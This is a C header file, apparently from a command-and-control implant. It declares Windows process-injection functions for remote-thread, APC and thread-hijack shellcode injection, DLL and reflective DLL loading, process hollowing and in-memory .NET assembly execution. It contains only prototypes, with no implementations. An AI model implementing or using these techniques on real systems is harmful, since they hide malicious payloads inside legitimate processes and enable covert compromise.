/**
 * @file inject.h
 * @brief Process injection techniques for Windows
 * 
 * Techniques:
 * - CreateRemoteThread (classic)
 * - QueueUserAPC (stealth)
 * - Process Hollowing (execute-assembly)
 * - Thread Hijacking (suspend/resume)
 */

#ifndef C2_INJECT_H
#define C2_INJECT_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Injection techniques */
typedef enum {
    INJECT_REMOTE_THREAD,     /* CreateRemoteThread */
    INJECT_QUEUE_APC,         /* QueueUserAPC */
    INJECT_PROCESS_HOLLOW,    /* Process hollowing */
    INJECT_THREAD_HIJACK,     /* Thread hijacking */
} inject_technique_t;

/**
 * @brief Inject shellcode into remote process
 * 
 * @param target_pid Target process ID
 * @param shellcode Shellcode buffer
 * @param shellcode_size Shellcode size
 * @param technique Injection technique
 * @return int 0 on success, -1 on failure
 */
int inject_shellcode(
    uint32_t target_pid,
    const uint8_t *shellcode,
    size_t shellcode_size,
    inject_technique_t technique
);

/**
 * @brief Inject DLL into remote process
 * 
 * @param target_pid Target process ID
 * @param dll_path Path to DLL
 * @return int 0 on success, -1 on failure
 */
int inject_dll(uint32_t target_pid, const char *dll_path);

/**
 * @brief Reflectively load DLL from memory
 * 
 * @param dll_data DLL file data
 * @param dll_size DLL file size
 * @return void* DLL base address or NULL on failure
 */
void *inject_reflective_dll(const uint8_t *dll_data, size_t dll_size);

/**
 * @brief Create hollow process
 * 
 * Creates suspended process and replaces with payload.
 * 
 * @param target_exe Target executable path (e.g., "notepad.exe")
 * @param payload Payload executable data
 * @param payload_size Payload size
 * @return uint32_t Process ID or 0 on failure
 */
uint32_t inject_process_hollow(
    const char *target_exe,
    const uint8_t *payload,
    size_t payload_size
);

/**
 * @brief Execute .NET assembly in memory
 * 
 * @param assembly_data .NET assembly bytes
 * @param assembly_size Assembly size
 * @param args Command line arguments
 * @return int 0 on success, -1 on failure
 */
int inject_execute_assembly(
    const uint8_t *assembly_data,
    size_t assembly_size,
    const char *args
);

#ifdef __cplusplus
}
#endif

#endif /* C2_INJECT_H */
